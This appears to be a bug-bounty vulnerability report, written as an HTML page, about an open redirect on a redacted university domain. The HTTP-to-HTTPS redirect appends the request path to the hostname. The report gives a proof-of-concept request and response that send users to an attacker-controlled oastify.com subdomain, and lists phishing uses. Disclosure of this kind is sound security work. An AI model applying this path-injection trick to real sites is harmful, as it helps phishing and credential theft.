@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Open Redirect via Path Injection in HTTP→HTTPS Redirect - BOUNTY-DEX</title>
+  <link rel="stylesheet" href="writeup.css">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>Open Redirect via HTTP to HTTPS Redirection</h1>
+      <div class="meta">
+        <p>BOUNTY-DEX Vulnerability Report</p>
+        <p>Type: <strong>Open Redirect / URL Manipulation</strong></p>
+      </div>
+      <span class="severity">LOW</span>
+    </header>
+
+    <h2>Summary</h2>
+    <p>
+      The affected application performs an automatic HTTP-to-HTTPS redirection and reflects user-controlled path content into the redirect target. By crafting a path that appends an attacker-controlled domain suffix, the application returns a 301 response redirecting users to a malicious external domain.
+    </p>
+
+    <h2>Technical Details</h2>
+    <p>
+      A normal request to a path like <code>/a</code> returns a redirect where path data is appended to the target URL.
+    </p>
+
+    <p>Request:</p>
+    <div class="code-block">
+      <code>
+GET /a HTTP/1.1<br>
+Host: XX.redacted.es
+      </code>
+    </div>
+    <p>Response:</p>
+    <div class="code-block">
+      <code>
+HTTP/1.1 301 Moved Permanently<br>
+Location: https://XX.redacted.esa
+      </code>
+    </div>
+
+    <p>
+      This behavior can be abused by injecting a crafted path that becomes part of the redirected hostname.
+    </p>
+
+    <h2>Proof of Concept</h2>
+
+    <p>Request:</p>
+    <div class="code-block">
+      <code>
+GET /.subdomain.oastify.com HTTP/1.1<br>
+Host: XX.redacted.es
+      </code>
+    </div>
+
+    <p>Response:</p>
+    <div class="code-block">
+      <code>
+HTTP/1.1 301 Moved Permanently<br>
+Location: https://XX.redacted.es.subdomain.oastify.com
+      </code>
+    </div>
+
+    <p>
+      Requests to the redirected URL reached the attacker-controlled server, confirming exploitability.
+    </p>
+
+    <h2>Impact</h2>
+    <div class="impact-box">
+      <ul>
+        <li>Can be used in phishing campaigns to redirect users from a trusted university domain to attacker infrastructure.</li>
+        <li>Improves credibility of malicious links by preserving a trusted prefix in the hostname.</li>
+        <li>Can assist credential harvesting or malware delivery through user confusion.</li>
+      </ul>
+    </div>
+
+    <a href="../" class="back-link">← Back to BOUNTY-DEX</a>
+  </div>
+</body>
+</html>
